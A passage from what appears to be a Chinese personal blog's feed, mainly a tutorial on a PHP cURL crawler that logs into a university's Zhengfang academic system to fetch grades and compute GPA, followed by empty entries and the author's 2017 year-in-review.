$xPath-&gt;query(&apos;//*[@id=&quot;DBGridInfo&quot;]/tbody/tr[2]&apos;);</span><br><span class="line">if($elements)&#123;</span><br><span class="line">	echo&apos;</span><br><span class="line">	&lt;div class=&quot;weui-msg&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;weui-msg__icon-area&quot;&gt;&lt;i class=&quot;weui-icon-success weui-icon_msg&quot;&gt;&lt;/i&gt;&lt;/div&gt;</span><br><span class="line">		&lt;div class=&quot;weui-msg__text-area&quot;&gt;</span><br><span class="line">			&lt;h2 class=&quot;weui-msg__title&quot;&gt;报考成功&lt;/h2&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div class=&quot;weui-msg__opr-area&quot;&gt;</span><br><span class="line">			&lt;p class=&quot;weui-btn-area&quot;&gt;</span><br><span class="line">				&lt;a href=&quot;javascript:;&quot; onClick=&quot;location.href=document.referrer&quot; class=&quot;weui-btn weui-btn_primary&quot;&gt;返回&lt;/a&gt;</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo&apos;</span><br><span class="line">	&lt;div class=&quot;weui-msg&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;weui-msg__icon-area&quot;&gt;&lt;i class=&quot;weui-icon-warn weui-icon_msg&quot;&gt;&lt;/i&gt;&lt;/div&gt;</span><br><span class="line">		&lt;div class=&quot;weui-msg__text-area&quot;&gt;</span><br><span class="line">			&lt;h2 class=&quot;weui-msg__title&quot;&gt;报考失败,请返回重试&lt;/h2&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div class=&quot;weui-msg__opr-area&quot;&gt;</span><br><span class="line">			&lt;p class=&quot;weui-btn-area&quot;&gt;</span><br><span class="line">				&lt;a href=&quot;javascript:;&quot; onClick=&quot;location.href=document.referrer&quot; class=&quot;weui-btn weui-btn_primary&quot;&gt;返回&lt;/a&gt;</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//*[@id=&quot;DBGridInfo&quot;]/tbody/tr[2]</span><br></pre></td></tr></table></figure>
<p>是需要判断的xpath路径，更加匹配该地址的值来判断是否实现报名。</p>
<h2><span id="github">Github</span></h2><p><a href="https://github.com/uknowsec/CETCrawler" target="_blank" rel="noopener">https://github.com/uknowsec/CETCrawler</a></p>
<h2><span id="reference">Reference</span></h2><p><a href="http://titohernandez.com/titohernandez/posting-multipart-form-data-using-curl-in-php/" target="_blank" rel="noopener">Posting multipart form data using curl in PHP.</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP爬虫-正方教务系统爬取成绩绩点]]></title>
      <url>https://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E7%88%AC%E5%8F%96%E6%88%90%E7%BB%A9%E7%BB%A9%E7%82%B9.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>从去年寒假开始，学校的一些二级域名就对外网访问进行了限制。而在校内同学们宿舍普遍是用的电信网，要使用内网需要到教学区域连学校的wifi才行。这样是很不方便的。</p>
<p>寒假一直想写个正方教务系统爬虫的，一直拖着拖着的没有完成。开学这一段时间挺闲的，目前完成了正方教务系统爬取成绩绩点和另外两个小项目，一个是正方系统一键报名四六级，一个是物业报修系统一键物业报修。这三个爬虫目前挂在自己的个人服务器上，以某种手段访问内网，后续会转移到内网服务器，转发到外网，提高访问速度。</p>
<p>习惯了，用博客记录自己写的东西，这里简单记录下正方教务系统爬虫成绩绩点的过程。</p>
<h2><span id="正文">正文</span></h2><h3><span id="ui设计">UI设计</span></h3><p>这里提下这个登陆表单和后端的UI界面，这里是借鉴了我在Github上看到的一个类似的项目</p>
<p><a href="https://github.com/wangyufeng0615/bjuthelper" target="_blank" rel="noopener">https://github.com/wangyufeng0615/bjuthelper</a></p>
<p>整个项目跟上述的项目有点类似，都是正方系统，仅仅是在一些小小的地方有区别。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/psb.png" alt=""></p>
<h3><span id="login_gradephp">login_grade.php</span></h3><p>在上面项目中，个别院校的教务系统是有无需验证码的接口的。而在我们学校是没有的，这里我们需要先获取到验证码</p>
<p>这里用到PHP中的CURL进行获取验证码，并把访问页面的cookie保存到本地。并把验证码图片保存到本地。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$rand_id = rand(100000, 999999);    //for verifycode</span><br><span class="line">require_verify_code();  //获取验证码</span><br><span class="line">function require_verify_code()&#123;</span><br><span class="line">    $cookie = dirname(__FILE__).&apos;/cookie/&apos;.$_SESSION[&apos;id&apos;].&apos;.txt&apos;;    //cookie路径  </span><br><span class="line">    $verify_code_url = &quot;http://localhost/CheckCode.aspx&quot;;      //验证码地址</span><br><span class="line">    $curl = curl_init();</span><br><span class="line">    curl_setopt($curl, CURLOPT_URL, $verify_code_url);</span><br><span class="line">    curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie);                     //保存cookie</span><br><span class="line">    curl_setopt($curl, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">    $img = curl_exec($curl);                                            //执行curl</span><br><span class="line">    curl_close($curl);</span><br><span class="line">    global $rand_id;</span><br><span class="line">    $path_of_verifyCode =dirname(__FILE__).&apos;/verifyCodes/verifyCode_&apos;.$rand_id.&apos;.jpg&apos;;</span><br><span class="line">    $fp = fopen($path_of_verifyCode,&quot;w&quot;);                                  //文件名</span><br><span class="line">    fwrite($fp,$img);                                                   //写入文件</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>login_grade后面的页面就是利用WEUI写得一个提交表单了，这里就不要过多的说了。</p>
<h3><span id="require_gradephp">require_grade.php</span></h3><h4><span id="抓包分析">抓包分析</span></h4><p>这里还是先简单的抓包分析，先抓登录页面的POST请求包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /Default2.aspx HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 207</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://localhost/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: UM_distinctid=161e202e63c6d9-094afdbce42fa2-3b60450b-1fa400-161e202e63d5b7; ASP.NET_SessionId=ht5hadjnbrhcbebuqa3khb3s</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">__VIEWSTATE=dDwtNTE2MjI4MTQ7Oz7j2BjEQ4cDEffr%2BK8yeXHBPnpEJg%3D%3D&amp;txtUserName=username&amp;Textbox1=&amp;TextBox2=password&amp;txtSecretCode=3vrd&amp;RadioButtonList1=%D1%A7%C9%FA&amp;Button1=&amp;lbLanguage=&amp;hidPdrs=&amp;hidsc=</span><br></pre></td></tr></table></figure>
<p>简单的看下POST提交的参数有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__VIEWSTATE=</span><br><span class="line"></span><br><span class="line">txtUserName=</span><br><span class="line"></span><br><span class="line">Textbox1=</span><br><span class="line"></span><br><span class="line">TextBox2=</span><br><span class="line"></span><br><span class="line">txtSecretCode=</span><br><span class="line"></span><br><span class="line">RadioButtonList1=</span><br><span class="line"></span><br><span class="line">&amp;Button1=&amp;lbLanguage=&amp;hidPdrs=&amp;hidsc=</span><br></pre></td></tr></table></figure>
<p>其中txtUserName是学号，TextBox2是密码，txtSecretCode是验证码，后面的参数直接默认提交就行。</p>
<p>这里重点的是__VIEWSTATE参数，这个参数是在登录页面里的。需要去获取这个参数，来找下这个参数的位置。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/viewstate.png" alt=""></p>
<p>这里我们需要得到这个value值,这里我们需要代入login_grade页面里的cookie放入得到响应的vivewstate值</p>
<p>同样利用curl来访问。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  //function: 构造post数据并登陆</span><br><span class="line">  function login_post($url,$cookie,$post)&#123;</span><br><span class="line">global $cookie;</span><br><span class="line">      $ch = curl_init();</span><br><span class="line">      curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">      curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">      curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</span><br><span class="line">      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //重要，抓取跳转后数据</span><br><span class="line">      curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); </span><br><span class="line">      curl_setopt($ch, CURLOPT_REFERER, &apos;http://localhost/default2.aspx&apos;);  //重要，302跳转需要referer，可以在Request Headers找到 </span><br><span class="line">      curl_setopt($ch, CURLOPT_POSTFIELDS,$post);  //post提交数据</span><br><span class="line">      $result=curl_exec($ch);</span><br><span class="line">      curl_close($ch);</span><br><span class="line">      return $result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$url=&quot;http://localhost/default2.aspx&quot;;  //教务地址</span><br><span class="line">$con1=login_post($url,$cookie,&apos;&apos;);               //登陆</span><br><span class="line">preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $con1, $view); //获取__VIEWSTATE字段并存到$view数组中</span><br></pre></td></tr></table></figure>
<p>传入教务网地址，访问登录页面，利用preg_match_all函数正则匹配到页面里的__VIEWSTATE的value值。</p>
<p>参数都准备好了，可以模拟登录了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   $_SESSION[&apos;xh&apos;]=$_POST[&apos;account&apos;];</span><br><span class="line">   $xh=$_POST[&apos;account&apos;];</span><br><span class="line">   $pw=$_POST[&apos;password&apos;];</span><br><span class="line">   $current_year=$_POST[&apos;current_year&apos;];</span><br><span class="line">   $current_term=$_POST[&apos;current_term&apos;];</span><br><span class="line">   $code= $_POST[&apos;verify_code&apos;];</span><br><span class="line">   $cookie = dirname(__FILE__) . &apos;/cookie/&apos;.$_SESSION[&apos;id&apos;].&apos;.txt&apos;;</span><br><span class="line"></span><br><span class="line">$post=array(</span><br><span class="line">       &apos;__VIEWSTATE&apos;=&gt;$view[1][0],</span><br><span class="line">       &apos;txtUserName&apos;=&gt;$xh,</span><br><span class="line">       &apos;TextBox2&apos;=&gt;$pw,</span><br><span class="line">       &apos;txtSecretCode&apos;=&gt;$code,</span><br><span class="line">       &apos;RadioButtonList1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;学生&apos;),</span><br><span class="line">       &apos;Button1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;登录&apos;),</span><br><span class="line">       &apos;lbLanguage&apos;=&gt;&apos;&apos;,</span><br><span class="line">       &apos;hidPdrs&apos;=&gt;&apos;&apos;,</span><br><span class="line">       &apos;hidsc&apos;=&gt;&apos;&apos;</span><br><span class="line">   );</span><br><span class="line">   $con2=login_post($url,$cookie,http_build_query($post));</span><br></pre></td></tr></table></figure>
<p>这样我们就成功的登录到教务系统了，接下来我们需要跳转到成绩页面。</p>
<p>同样抓包分析，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /xscjcx.aspx?xh=1111111 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 3839</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://localhost/xscjcx.aspx?xh=208150815&amp;xm=%B3%C9%CF%E9%D4%C0&amp;gnmkdm=N121617</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: UM_distinctid=161e202e63c6d9-094afdbce42fa2-3b60450b-1fa400-161e202e63d5b7; ASP.NET_SessionId=ht5hadjnbrhcbebuqa3khb3s</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=dDw&amp;hidLanguage=&amp;ddlXN=2017-2018&amp;ddlXQ=1&amp;ddl_kcxz=&amp;btn_xq=%D1%A7%C6%DA%B3%C9%BC%A8</span><br></pre></td></tr></table></figure>
<p>这里是查询用户选择学期的POST请求包，url里的/xscjcx.aspx?xh=中的xh是用户学号。</p>
<p>POST参数里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=dDw&amp;hidLanguage=&amp;ddlXN=2017-2018&amp;ddlXQ=1&amp;ddl_kcxz=&amp;btn_xq=%D1%A7%C6%DA%B3%C9%BC%A8</span><br></pre></td></tr></table></figure>
<p>这几个参数都可以看出他们的意思，重要的是获取__VIEWSTATE的value值，同样利用一个正则去获取这个值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$url2=&quot;http://localhost/xscjcx.aspx?xh=&quot;.$_SESSION[&apos;xh&apos;];</span><br><span class="line">$viewstate=login_post($url2,&apos;&apos;);</span><br><span class="line">preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $viewstate, $vs);</span><br><span class="line">$state=$vs[1][0];  //$state存放一会post的__VIEWSTATE</span><br></pre></td></tr></table></figure>
<p>获取到所有参数，提交post数据报就可以返回值了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$post=array(</span><br><span class="line"> &apos;__EVENTTARGET&apos;=&gt;&apos;&apos;,</span><br><span class="line"> &apos;__EVENTARGUMENT&apos;=&gt;&apos;&apos;,</span><br><span class="line"> &apos;__VIEWSTATE&apos;=&gt;$state,</span><br><span class="line"> &apos;hidLanguage&apos;=&gt;&apos;&apos;,</span><br><span class="line">   &apos;ddlXN&apos;=&gt;$current_year,  //当前学年</span><br><span class="line">   &apos;ddlXQ&apos;=&gt;$current_term,  //当前学期</span><br><span class="line">   &apos;ddl_kcxz&apos;=&gt;&apos;&apos;,</span><br><span class="line">   &apos;btn_xq&apos;=&gt;&apos;%D1%A7%C6%DA%B3%C9%BC%A8&apos;  //“学期成绩”的gbk编码，视情况而定</span><br><span class="line">   );</span><br><span class="line">$content=login_post($url2,$cookie,http_build_query($post)); //获取原始数据</span><br></pre></td></tr></table></figure>
<p>这里就得到要查询的学期的成绩了，得到的HTML里的table标签的数据，需要转换为数组进行输出。</p>
<p>用到一个函数get_td_array()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function get_td_array($table) &#123;</span><br><span class="line">    $table = preg_replace(&quot;&apos;&lt;table[^&gt;]*?&gt;&apos;si&quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = preg_replace(&quot;&apos;&lt;tr[^&gt;]*?&gt;&apos;si&quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = preg_replace(&quot;&apos;&lt;td[^&gt;]*?&gt;&apos;si&quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = str_replace(&quot;&lt;/tr&gt;&quot;,&quot;&#123;tr&#125;&quot;,$table);</span><br><span class="line">    $table = str_replace(&quot;&lt;/td&gt;&quot;,&quot;&#123;td&#125;&quot;,$table);</span><br><span class="line">        //去掉 HTML 标记</span><br><span class="line">    $table = preg_replace(&quot;&apos;&lt;[/!]*?[^&lt;&gt;]*?&gt;&apos;si&quot;,&quot;&quot;,$table);</span><br><span class="line">        //去掉空白字符</span><br><span class="line">    $table = preg_replace(&quot;&apos;([rn])[s]+&apos;&quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = preg_replace(&apos;/&amp;nbsp;/&apos;,&quot;&quot;,$table);</span><br><span class="line">    $table = str_replace(&quot; &quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = str_replace(&quot; &quot;,&quot;&quot;,$table);</span><br><span class="line">    $table = explode(&apos;&#123;tr&#125;&apos;, $table);</span><br><span class="line">    array_pop($table);</span><br><span class="line">    foreach ($table as $key=&gt;$tr) &#123;</span><br><span class="line">        $td = explode(&apos;&#123;td&#125;&apos;, $tr);</span><br><span class="line">        array_pop($td);</span><br><span class="line">        $td_array[] = $td;</span><br><span class="line">    &#125;</span><br><span class="line">    return $td_array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从该函数的代码来看，可以看出是利用正则匹配table标签下的tr,td将数据通过遍历存入数组返回。</p>
<p>到这里当前学期的成绩详情都可以获取到了。</p>
<p>下面是绩点的计算，我们学校的系统是把已修学科的学分绩点都列出来了的。我们只需要把数据爬取出来做一个简单的计算就行了。</p>
<p>数据报跟查询学期成绩是差不多的。简单的看下post数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$post_allgrade=array(</span><br><span class="line"> &apos;__EVENTTARGET&apos;=&gt;&apos;&apos;,</span><br><span class="line"> &apos;__EVENTARGUMENT&apos;=&gt;&apos;&apos;,</span><br><span class="line"> &apos;__VIEWSTATE&apos;=&gt;$state,</span><br><span class="line"> &apos;hidLanguage&apos;=&gt;&apos;&apos;,</span><br><span class="line">   &apos;ddlXN&apos;=&gt;$current_year,  //当前学年</span><br><span class="line">   &apos;ddlXQ&apos;=&gt;$current_term,  //当前学期</span><br><span class="line">   &apos;ddl_kcxz&apos;=&gt;&apos;&apos;,</span><br><span class="line">   &apos;btn_zcj&apos;=&gt;&apos;%C0%FA%C4%EA%B3%C9%BC%A8&apos;  //历年成绩-gbk</span><br><span class="line">   );</span><br><span class="line">$content_allgrade=login_post($url2,$cookie,http_build_query($post_allgrade)); //获取原始数据</span><br><span class="line">$content_allgrade=get_td_array($content_allgrade);    //table转array</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//计算总的加权分数和总的GPA</span><br><span class="line">$i = 5;         //从array[5]开始是有效信息</span><br><span class="line">$all_value = 0; //总的学分权值</span><br><span class="line">$all_GPA = 0;   //总的GPA*分数</span><br><span class="line">$all_number_of_lesson_with_public = 0;</span><br><span class="line">$all_score_of_lesson_with_public = 0;</span><br><span class="line">//计算总和的东西，学分/GPA	</span><br><span class="line">while(isset($content_allgrade[$i][4]))&#123;</span><br><span class="line">	if ($content_allgrade[$i][5] == iconv(&quot;utf-8&quot;,&quot;gb2312//IGNORE&quot;,&quot;公选&quot;))&#123;</span><br><span class="line">		//计算公选课课程数和总学分</span><br><span class="line">		$all_number_of_lesson_with_public ++;</span><br><span class="line">		$all_score_of_lesson_with_public += $content_allgrade[$i][6];</span><br><span class="line">		$i++;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		$all_value += $content_allgrade[$i][6];	//已修总学分</span><br><span class="line">		$all_GPA += ($content_allgrade[$i][6] * $content_allgrade[$i][7]); </span><br><span class="line">		$i++;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>上面是一个简单的计算GPA的过程，简单来说就是一个遍历叠加计算的过程。</p>
<p>到这里require_grade页面的PHP部分差不多都说完了，后面的数据的排版输出了。</p>
<h2><span id="github">Github</span></h2><p><a href="https://github.com/uknowsec/GPACrawler" target="_blank" rel="noopener">https://github.com/uknowsec/GPACrawler</a></p>
<h2><span id="reference">Reference</span></h2><p><a href="https://github.com/wangyufeng0615/bjuthelper" target="_blank" rel="noopener">https://github.com/wangyufeng0615/bjuthelper</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title></title>
      <url>https://uknowsec.cn/posts/uncategorized/2016-09-29.html</url>
      <content type="html"><![CDATA[<hr>
<h2><span id="">{}</span></h2>]]></content>
      
        
    </entry>
    
    <entry>
      <title></title>
      <url>https://uknowsec.cn/posts/uncategorized/2016-08-28.html</url>
      <content type="html"><![CDATA[<hr>
<h2><span id="">{}</span></h2>]]></content>
      
        
    </entry>
    
    <entry>
      <title></title>
      <url>https://uknowsec.cn/posts/uncategorized/2016-10-19.html</url>
      <content type="html"><![CDATA[<hr>
<h2><span id="">{}</span></h2>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Summary of 2017]]></title>
      <url>https://uknowsec.cn/posts/life/Summary-of-2017.html</url>
      <content type="html"><![CDATA[<h1><span id="生活">生活</span></h1><p>2017年我从大二进入大三，算是在南京过了第一个大学暑假。我对暑假的实习生活有很多感慨，同时对我大三上学期这一年的感慨也挺多的。可能是因为大二下学期太久远了，以至于我都忘记我大二下学期都干了些什么了，记得实习那段时间过得挺辛苦的，每天挤着南京的早班地铁去公司。</p>
<p>我第一感受到了自己的成长，就跟电视剧里看的那样穿着简单T恤，背着背包，挤着地铁。这种感觉很奇妙，就好像我第一次走进大学的校园那种感觉。那段时间习惯了早上拿上一瓶牛奶，口里咬着小面包，骑着小黄车去上班。下午在义乌的小摊小贩上打上一份普通的晚饭，同样是骑着小黄车汗流浃背的回到宿舍。</p>
<p>暑假的后一个月，学校宿舍基本都是没人的，于是把音乐开外放到最大，放一曲民谣，洗完澡坐在椅子上刷刷手机。大学这几年爱上了民谣，一直都在听，手机里放的都是不知民的小歌手的民谣歌曲。因为我喜欢他们的小众，喜欢他们所叙说的简单故事，直截了当，简单明了。</p>
<p>大三上学期也是匆匆忙忙，结束实习后立下flag，好像也没有完成什么。期间断断续续地赚了几个钱，加上实习的少许工资，得以过活这一个学期的生活。同时也做了一个很意外的决定。但是失败了，之后还感觉有一点点小小的难堪。不过，自己也在这次中学到了很多，成长了很多。并不觉得是一次错误的决定，可能是因为我个人的原因所导致的。</p>
<h1><span id="学习">学习</span></h1><p>大三整个学期的学校课程可能就归结于最后的一个月吧，其实一个学期下来也没听什么，都是最后一个月快考试了突击一下。庆幸的是，刚刚查了查成绩也基本上过了。同时要提下我的英语四级了，经过四次考试，最终以425分一分不多一份不少过了，之前还担心过自己因为这个拿不到毕业证过。</p>
<p>大二立了一个科创项目，今年也结束了。答辩很水，主要还是了解了整个项目开发流程，也从中学到了android和web的交互方面的知识。结束后，在老师的要求下还申请了一个实用新型的专利认证。我对于这些什么证书好像看得不是很重要，但老师一再要求，所以写了一份申请书给他。</p>
<p>博客从2016年搭建起来到现在也差不多一年多了，自己很看重这个。一直写点东西往上面传，可能没有什么干货，都是一些简单的记录和学习笔记。暑假在实习公司是我博客更新最频繁的一段时间，因为我一直在学WEB安全方面的东西，每每学习一方面的知识我都用博客记录下来，这段时间也是我博客访问量最多的时间。</p>
<p>结束实习后，实习公司的前辈们开始每个星期在群里出几个CTF的题目，我也陆陆续续的跟着做，这些题目不难，但涉及面很广，都是一些基础的东西，很有益于我现在的状态，一个基础并不是那么扎实的新人，自己记录每一个题目的解题思路，理解整个过程。不会便请教前辈。</p>
<p>这一年来也在不断加强自己的编程能力，可能效果并不是那么明显。也就是跟着视频里的项目实战，一边看一边写。期间学习了ThinkPHP框架，同时写写PHP和Python。这使我在做CTF题目时更容易去理解代码。以致于做题时不是那么懵逼，加快做题的速度。</p>
<h1><span id="展望">展望</span></h1><p>这几天估摸着换一台新的机器，现在这台机器也是大一大二陪我一直熬到宿舍断电，电池空血过的。换机器也是挺不容易的一件事，一是经济，二是这台老机器上有太多的东西需要后面转移和处理了，所以我想我会很珍惜新机器。</p>
<p>过完年去也就大三下了，我感觉这两年来在南京上学过得挺无趣的，没有多出去走走，整天呆在学校不知道在捣鼓什么，计划着找个时间，找个伴出去走走。伴这种事也不能强求，记得当时我自己说的好，现在的自己还没有任何能力，靠着父母的钱过活。所以等我能靠自己过活再说伴的事吧。</p>
<p>一直挺喜欢民谣的，自己也在南京。南京民谣莫过于李志。其实今年元旦挺想去看李志的演唱会的，但是后来还是不了了之。明年有机会，带上那个还是未知的伴去看一场李志的演唱会，就买最便宜的票。然后去街头找寻李志歌里所唱的南京。</p>
<p>2018年暑假前，还是要多多学习技术方面的东西。编程、渗透、CTF等一些基础的知识，该学，该跟上的还是要一个一个脚踏实地的跟上学习，为大三下学期暑假实习做好充分的准备。希望自己能找到一个不错的实习，在实习中学到一些知识来提高自己。</p>
]]></content>
      
        <categories>
            
